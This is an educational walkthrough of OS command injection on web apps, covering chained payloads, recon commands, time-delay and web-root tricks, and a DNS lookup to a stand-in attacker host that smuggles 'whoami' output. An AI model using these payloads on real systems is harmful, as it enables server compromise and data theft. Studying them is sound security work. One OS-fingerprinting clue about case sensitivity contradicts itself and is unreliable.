### ⚡ Attack Style: OS Command Injection (The Server-Side Takeover)

**The Goal:** Execute arbitrary operating system commands directly on the server hosting a vulnerable web application, achieving full application compromise and a foothold for internal network pivoting.

---

#### 🧩 Concept: When the Web App Hands Over the Terminal

* **What is OS Command Injection?** Also known as shell injection, this vulnerability occurs when an application takes user-supplied data and unsafely passes it directly to a system shell (like Bash or CMD) for execution.
* **The Server-Side Danger:** While vulnerabilities like XSS execute code inside a *victim's browser*, OS command injection executes code directly on the **host server**.
* **The Ultimate Impact:** Successfully exploiting this means you aren't just manipulating the webpage; you are executing terminal commands as the application user. This typically results in full data theft, system manipulation, and an entry point to attack other internal servers within the organization's infrastructure.

---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like tricking a security guard into running your personal errands:

1. **The Flawed Automation:** The web application has a feature that interacts with the underlying operating system (for example, checking a server's ping status).
2. **The Unsanitized Input:** Instead of strictly validating what you type, the app blindly appends your input to its pre-written command.
3. **The Command Chaining:** By injecting special terminal separators (like semicolons, ampersands, or pipes), you close out the original command and append your own malicious instructions.
4. **The Host Execution:** The server's operating system executes your commands sequentially, handing you raw terminal-level control over the machine!

### ⚡ Attack Style: OS Command Injection via Separators (The Chain-Reaction Trick)

**The Goal:** Inject arbitrary terminal commands into a vulnerable application parameter by leveraging shell command separators (like `&`) to chain and execute multiple instructions on the host server.

---

#### 🧩 Concept: Chaining Commands Through the Back Door

* **The Backend Flaw:** When an application takes user input and passes it straight to a system shell script (e.g., `stockreport.pl 381 29`), it often fails to sanitize punctuation.
* **The Power of Separators:** Characters like ampersands (`&`), semicolons (`;`), or pipes (`|`) act as command separators in terminal shells. They tell the operating system: *"Finish the current command right here, and immediately start running the next one."*
* **The Verification Trick (`echo`):** To test if command injection is possible without breaking the entire application or downloading malicious payloads, attackers often use an `echo` command. If the server parrots back a unique test string in the response, you instantly know your command executed.

---

#### 🛠️ The Payload & How It Works

* **Vulnerable Parameter Setup:**
```text
https://insecure-website.com/stockStatus?productID=381&storeID=29

```


* **The Injected Payload:**
```text
& echo aiwefwlguh &

```


* **Resulting Terminal Execution:**
```bash
stockreport.pl & echo aiwefwlguh & 29

```


* **The Three-Part Output Breakdown:**
1. **The Broken First Command:** `stockreport.pl` runs without its expected argument, returning an initial error message.
2. **The Echo Proof:** The injected `echo aiwefwlguh` executes successfully, printing your custom string directly into the response.
3. **The Trailing Remnant:** The leftover original argument (`29`) tries to execute as a standalone command, throwing a `command not found` error.



*(Note: Wrapping the injected command between two separators acts as a buffer, preventing whatever parameters follow the injection point from breaking your payload.)*

---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like slipping extra instructions onto a work order:

1. **The Blind Insertion:** You slide a command separator (`&`) into a parameter field, prematurely ending the developer's intended script.
2. **The Hijack Command:** You type your own terminal instruction (like printing a test string via `echo`) right in the middle.
3. **The Buffer Shield:** You close with a second separator to safely swallow whatever leftover arguments or code the server was expecting next.
4. **The Confirmation:** The server processes the split instructions sequentially, spitting your unique test string back out to confirm you have complete command execution rights!

🎯 When the server processes that injected URL, it runs all three parts in its terminal and usually pastes the **terminal's output** directly back into the webpage response (for example, inside the stock status text box).

The HTTP response body would look something like this:

```text
Error: Missing store ID parameter.
aiwefwlguh
29: command not found

```

Why it looks like that:

1. **The First Part (`stockreport.pl 381`):** It runs the script, but because you cut it off with an ampersand, it might throw a minor error or output a partial message.
2. **The Magic Part (`aiwefwlguh`):** Because your `echo` command executed successfully, your exact random string is printed right into the output. **Seeing this string in the response is your green light** that command injection is working!
3. **The Trailing Remnant (`29: command not found`):** The server tries to run the leftover `29` as a standalone terminal command, realizes it isn't a valid command, and throws an error.

Seeing that custom string appear in the website's response tells you: *"I have full control over the underlying server's terminal."*

### ⚡ Attack Style: OS Command Reconnaissance (Mapping the Host)

**The Goal:** Gather critical system intelligence immediately after achieving command injection to identify user privileges, operating system architecture, network settings, and active processes.

---

#### 🧩 Concept: Casing the Joint Before the Takeover

* **The Post-Exploitation Dilemma:** Just getting command execution isn't enough; you need to know *where* you landed. Are you running as a low-privileged service account or root/administrator? Is it a Linux distribution or a Windows server?
* **The Reconnaissance Strategy:** Attackers rely on native operating system utilities to quickly map the environment without needing to upload external files or tools that might trigger security alarms.

---

#### 🛠️ Essential Reconnaissance Commands Cheat Sheet

| Purpose | Linux Command | Windows Command |
| --- | --- | --- |
| **Name of current user** | `whoami` | `whoami` |
| **Operating system version** | `uname -a` | `ver` |
| **Network configuration** | `ifconfig` | `ipconfig /all` |
| **Network connections** | `netstat -an` | `netstat -an` |
| **Running processes** | `ps -ef` | `tasklist` |

---

#### 🎯 Plain-English Breakdown of the Reconnaissance Phase

Think of this like an infiltrator quietly scoping out the layout of a building right after picking the lock:

1. **Checking Your ID (`whoami`):** You immediately check your user privileges to see if you hold administrative/root access or if you need to look for privilege escalation vectors.
2. **Reading the Blueprint (`uname -a` / `ver`):** You check the OS and kernel version to figure out what system quirks or local exploits will work.
3. **Mapping the Infrastructure (`ifconfig` / `netstat` / `ps`):** You inspect the network layout, active connections, and running processes to understand how the server communicates, what internal services are running, and whether there are open paths to pivot deeper into the organization!

### ⚡ Attack Style: Blind OS Command Injection (The Silent Execution)

**The Goal:** Detect and confirm code execution on a target server when the application processes terminal commands in the background without ever returning the command's output in the HTTP response.

---

#### 🧩 Concept: Shouting Into the Void

* **What is Blind Injection?** Not every vulnerable application hands you the terminal output on a silver platter. Sometimes, user input is passed to a backend system process (like a mailing daemon or cron job) asynchronously, meaning the web page just says *"Thank you for your feedback!"* and leaves you blind to what actually happened on the server.
* **Why Standard Tricks Fail:** If the server doesn't echo results back to your browser window, a basic `echo` payload is useless because the terminal's response vanishes into server-side logs or standard output black holes.
* **The Example Setup:** A feedback form takes an email address and inserts it directly into a system mail command:
```bash
mail -s "Subject" -aFrom:peter@normal-user.net feedback@vulnerable-website.com

```


If you inject a command into that parameter, the server will execute it silently in the background.

---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like sending a secret signal into a windowless room:

1. **The Blind Drop:** You inject your command through an invisible backend pathway (like a contact form or background job queue), knowing the server's shell will dutifully process it.
2. **The Echo Void:** The server executes your instructions completely, but it throws away the terminal's reply instead of showing it on your screen.
3. **The Pivot to Indirect Proof:** Because you can't *see* the output directly, you have to rely on alternative covert techniques—such as forcing the server to pause for a few seconds (time delays) or forcing it to reach out to an external server you control (out-of-band communication)—to prove that your command injection actually worked!

### ⚡ Attack Style: Blind OS Command Injection via Time Delays (The Stopwatch Trick)

**The Goal:** Confirm blind command execution on a target server when you can't see any output, by forcing the server to pause and measuring the exact delay in its HTTP response.

---

#### 🧩 Concept: Using a Digital Heartbeat to Prove Execution

* **The Blind Problem:** When an app doesn't return terminal output, you have no immediate visual proof that your command ran.
* **The Stopwatch Solution:** If you can trick the server's shell into pausing for a specific number of seconds before responding, you can use a stopwatch on your end. A delayed HTTP response acts as unmistakable proof that your command was executed.
* **The Tool of Choice:** The `ping` command is ideal for this because network utilities let you specify exactly how many packets to send, giving you precise control over the duration of the pause.

---

#### 🛠️ The Payload & How It Works

* **The Injected Payload (Linux):**
```text
& ping -c 10 127.0.0.1 &

```


* **How the Payload Works:**
* `ping` $\rightarrow$ Sends ICMP network packets.
* `-c 10` $\rightarrow$ Specifies the packet count (sending exactly 10 packets).
* `127.0.0.1` $\rightarrow$ Targets the server's own loopback network adapter (so it doesn't need external internet access).
* *The Result:* The server is forced to wait out the full 10-second ping cycle before it can finish processing and send the HTTP response back to you.



---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like testing if someone is home by listening for a specific delay at the door:

1. **The Silent Injection:** You slide a command into a blind parameter, instructing the server's shell to ping itself 10 times.
2. **The Forced Pause:** The backend application freezes up, dutifully counting down 10 seconds worth of network packets before it finishes its job.
3. **Measuring the Lag:** You watch your browser's network tab or stopwatch. If the page normally loads instantly but suddenly hangs for precisely 10 seconds, you have absolute confirmation.
4. **The Verdict:** The artificial delay unmasks the blind vulnerability, proving beyond a shadow of a doubt that your commands are executing on the host server!

### ⚡ Attack Style: Blind OS Command Injection via Output Redirection (The Smuggled File Drop)

**The Goal:** Exfiltrate the terminal output of a blind command injection by forcing the server to dump the results into a public web directory, allowing you to fetch and read the file directly through your browser.

---

#### 🧩 Concept: Slipping a Note Through the Front Door

* **The Blind Problem:** The application executes your commands in the background, but it never prints the terminal results back into the web page response.
* **The Web Root Trick:** Every web server has a "web root"—a designated directory on the filesystem where it stores public files (like images, CSS sheets, and static pages) that anyone can visit via a URL.
* **The Exfiltration Strategy:** If you can't *shout* the output back through the response, you can write the command's results into a text file right inside that public web folder. Once it's there, you simply use your browser to download and read it!

---

#### 🛠️ The Payload & How It Works

* **The Injected Payload:**
```text
& whoami > /var/www/static/whoami.txt &

```


* **How the Payload Works:**
* `whoami` $\rightarrow$ Executes the reconnaissance command to find the current user.
* `>` $\rightarrow$ The shell redirection operator. Instead of printing to the screen, it grabs the output and writes it into a file.
* `/var/www/static/whoami.txt` $\rightarrow$ The absolute path pointing directly into the server's public static web directory.
* *(The trailing `&` acts as a safety separator to keep the surrounding command syntax from breaking).*


* **The Retrieval Step:**
Once executed, you browse directly to the file via HTTP:
```text
https://vulnerable-website.com/whoami.txt

```


The server treats it like any normal static file and serves the command's secret output right to your screen!

---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like leaving a confidential document inside a public drop-box:

1. **The Hidden Execution:** You inject your command into a blind parameter, instructing the server's terminal to run a tool like `whoami`.
2. **The Redirection (`>`):** Instead of letting the output vanish into a black hole, you force the terminal to pipe the text straight into a new text file.
3. **Planting the Evidence:** You place that text file inside a folder on the server that is already configured to be publicly downloadable.
4. **The Pickup:** You walk up to the front door (by typing the file's URL into your browser) and casually pick up your own smuggled file to read the results!

### ⚡ Attack Style: Blind OS Command Injection via Out-of-Band (OAST) (The Ping-Back Trap)

**The Goal:** Prove that a blind command injection worked by tricking the target server into sending a network message to a private server that you control.

---

#### 🧩 Concept: Making the Server Call Home

* **The Problem:** The app is totally blind. It doesn't show command output on the screen, and you don't want to mess around with slow time delays.
* **The OAST Solution:** Instead of waiting for the server to talk to *you*, you force the server to talk to the outside world. You make it look up a website address that belongs to you.
* **How You Catch It:** You monitor your own private server. The exact moment the target server tries to visit your domain, you get a notification—proving instantly that your command ran successfully!

---

#### 🛠️ The Payload & How It Works

* **The Injected Payload:**
```text
& nslookup kgji2ohoyw.web-attacker.com &

```


* **How the Payload Works:**
* `nslookup` $\rightarrow$ A built-in computer tool used to look up website addresses (DNS lookups).
* `kgji2ohoyw.web-attacker.com` $\rightarrow$ A random, unique web address belonging to a server you own.
* *The Result:* The target server's operating system tries to find your website, sending a network request straight to your logs.



---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like sending a homing pigeon to see if someone received your message:

1. **The Hidden Call:** You inject a command that tells the server to look up a specific website address owned by you.
2. **The Reach-Out:** The server dutifully obeys your command and knocks on the door of your external server to ask for directions.
3. **The Catch:** Your server logs the visit, showing you a record of the request.
4. **Success:** Even though the web app never showed you any output, your private logs light up—confirming 100% that you have command execution on the target machine!

### ⚡ Attack Style: Blind OS Command Injection via OAST Data Exfiltration (The DNS Data Smuggle)

**The Goal:** Extract sensitive command output (like user accounts or system data) from a completely blind target server by smuggling the data inside an outgoing DNS lookup request.

---

#### 🧩 Concept: Smuggling Data Through Website Names

* **The Limitation of Standard OAST:** A basic DNS lookup tells you *that* a command ran, but it doesn't show you the actual answer (like what user account the server is running on).
* **The Backtick Trick:** Terminal shells use backticks (```) to run a command first and paste its exact result directly into the text string before executing the main command.
* **Hiding Data in Domain Names:** If you wrap a command like `whoami` inside the web address you tell the server to look up, the output becomes part of the domain name. When the server requests that address, your personal DNS server receives the data sitting right inside the URL prefix!

---

#### 🛠️ The Payload & How It Works

* **The Injected Payload:**
```text
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &

```


* **How the Payload Works:**
* ``whoami`` $\rightarrow$ Runs first behind the scenes, grabbing the current username (for example, `wwwuser`).
* **The Assembly:** The shell combines that username with your domain, creating a brand new web address: `wwwuser.kgji2ohoyw.web-attacker.com`.
* `nslookup` $\rightarrow$ Forces the server to look up this newly constructed address.



---

#### 🎯 Plain-English Breakdown of the Attack

Think of this like writing your secret answer on the outside of an envelope before mailing it:

1. **Running the Inside Task:** The server executes your hidden command (like `whoami`) and gets the result (e.g., `wwwuser`).
2. **Attaching the Label:** It pastes that result directly onto the front of your website's address.
3. **Mailing the Package:** The server sends a DNS lookup request looking for that custom web address out to the internet.
4. **Reading the Mail:** Your private DNS server catches the incoming request logs, reads the prefix (`wwwuser`), and instantly hands you the secret data without the web application ever showing you a single word!

### ⚡ Attack Style: Shell Metacharacters (The Command-Chaining Toolkit)

**The Goal:** Learn how to use different terminal symbols (metacharacters) to chain, split, or inline commands across Windows and Unix systems—even when your input is locked inside quotation marks.

---

#### 🧩 Concept: The Punctuation of the Terminal

* **What are Metacharacters?** These are special punctuation marks (like ampersands, pipes, and semicolons) that command-line shells use to manage multiple instructions.
* **The Chaining Trick:** Instead of typing just one command, you use these characters to tell the system: *"Finish the first task, then immediately start running my custom command!"*
* **The Rules Change by Operating System:** Some symbols work everywhere (Windows and Linux), while others only work on Unix-based systems. Plus, if the app wraps your input in quotation marks, you have to break out of them first before your metacharacters will work.

---

#### 🛠️ The Metacharacter Toolkit Cheat Sheet

* **Universal Separators (Work on both Windows & Unix):**
* `&` $\rightarrow$ Run the next command regardless of whether the first one succeeds.
* `&&` $\rightarrow$ Run the next command **only if** the first command succeeds.
* `|` $\rightarrow$ Pipe (send) the output of the first command straight into the input of the next command.
* `||` $\rightarrow$ Run the next command **only if** the first command fails.


* **Unix-Only Separators:**
* `;` $\rightarrow$ Run commands sequentially, one after another.
* `Newline` (`\n` or `0x0a`) $\rightarrow$ Pressing enter to force a brand-new command line.


* **Unix Inline Execution (Running commands inside commands):**
* ``injected command`` (Backticks) $\rightarrow$ Runs the command inside first and pastes the result right into the sentence.
* `$(injected command)` $\rightarrow$ Does the exact same thing as backticks, but easier to nest.


* **Escaping Quotes:**
* If the app puts your input inside quotes like `value="YOUR_INPUT"`, your payload won't work until you type a matching quote (`"` or `'`) to close it out *before* adding your metacharacters.



---

#### 🎯 Plain-English Breakdown of the Technique

Think of this like writing instructions in a text message:

1. **The Punctuation Power:** Just like commas, periods, and conjunctions change how a sentence is read, terminal symbols change how a server reads your instructions.
2. **Choosing the Right Tool:** If you are on a Linux server, a semicolon (`;`) or a newline is an easy way to start a fresh command. If you aren't sure what OS it is, universal symbols like `&` or `|` are your safest bet.
3. **Breaking Out of Cages:** If the developer put your input inside quotation marks, you simply type a closing quote first to break free, drop your separator, and take full control of the terminal!

### ⚡ Attack Style: OS Fingerprinting (Detecting the Server's Operating System)

**The Goal:** Discover whether the target web application runs on a Linux/Unix or Windows operating system so you can choose the correct command payloads and attack vectors.

---

#### 🧩 Concept: Reading the Server's Digital Footprint

* **Why It Matters:** Linux and Windows use completely different command sets, file paths, and shells. If you inject a Linux command (`whoami`) into a Windows server, it will fail. You need to know your target's operating system before executing OS commands.
* **The Detective Work:** Web servers rarely hide their true nature completely. They accidentally leak clues through HTTP response headers, error messages, file naming conventions, and network packet behaviors.

---

#### 🛠️ Core OS Fingerprinting Techniques

* **1. Checking HTTP Response Headers**
* *What to look for:* Examine the `Server` or `X-Powered-By` headers using developer tools or Burp Suite.
* *Clues:*
* `Server: Microsoft-IIS/10.0` $\rightarrow$ Definitely Windows.
* `Server: Apache/2.4.41 (Ubuntu)` or `nginx/1.18` $\rightarrow$ Likely Linux/Unix.




* **2. The Case-Sensitivity Test**
* *What to look for:* Linux filesystems are strictly case-sensitive, while Windows (NTFS) is case-insensitive.
* *Clues:* If you request `/About.php` and `/about.php`, and both return the exact same page on Linux, but Windows might serve the file regardless of uppercase/lowercase differences.


* **3. Analyzing Error Messages & Paths**
* *What to look for:* Trigger a minor application error to see if the server leaks its file paths.
* *Clues:*
* Forward slashes (`/var/www/html/...`) $\rightarrow$ Linux/Unix.
* Backslashes and drive letters (`C:\inetpub\wwwroot\...`) $\rightarrow$ Windows.




* **4. Network TTL (Time-to-Live) Probing**
* *What to look for:* Ping the target server and check the initial TTL value returned in the packet header.
* *Clues:*
* Linux / Unix $\rightarrow$ Initial TTL is usually **64**.
* Windows $\rightarrow$ Initial TTL is usually **128**.





---

#### 🎯 Plain-English Breakdown of the Technique

Think of this like figuring out what kind of car someone drives by looking at the tracks they leave behind:

1. **Checking the Badges (Headers):** You look at the server's welcome banner in the HTTP response to see if it openly admits to running Windows IIS or Apache on Linux.
2. **Testing the Rules (Case Sensitivity):** You tweak the capitalization of a URL. If the server throws a fit over a single capital letter, you know it's strict Linux; if it doesn't care, it's likely Windows.
3. **Reading the Trash (Error Leaks):** If the app crashes or throws a verbose error, you scan the file paths for backslashes or forward slashes to instantly confirm whether you're dealing with a Linux filesystem or a Windows drive!

### 🌐 How to Find the TTL Value (Terminal Guide)

To check a target server's TTL (Time-to-Live) and figure out its operating system, you use the **`ping`** command directly inside your terminal.

---

### 💻 The Commands

* **For Linux / macOS:**
```bash
ping -c 4 targetwebsite.com

```


*(The `-c 4` tells it to stop after sending 4 packets so it doesn't run forever.)*
* **For Windows:**
```bash
ping targetwebsite.com

```


*(Windows automatically stops after 4 packets by default.)*

---

### 🔍 What to Look For in the Output

When you run the command, look at the results scrolling in your terminal. Find the part that says **`ttl=`**:

```bash
64 bytes from 192.0.2.1: icmp_seq=1 ttl=54 time=14.2 ms

```

👉 *Here, the returned value is `ttl=54`.*

---

### 🧠 Quick OS Cheat Sheet

Because packets lose a few numbers as they bounce across internet routers, the number you see will be slightly lower than the OS's **original starting value**:

* 🐧 **Linux / Unix:** Usually starts at **64** (If you see `ttl=50` to `64`, it's Linux).
* 🪟 **Windows:** Usually starts at **128** (If you see `ttl=110` to `128`, it's Windows).
* 🌐 **Routers / Cisco:** Usually starts at **255**.
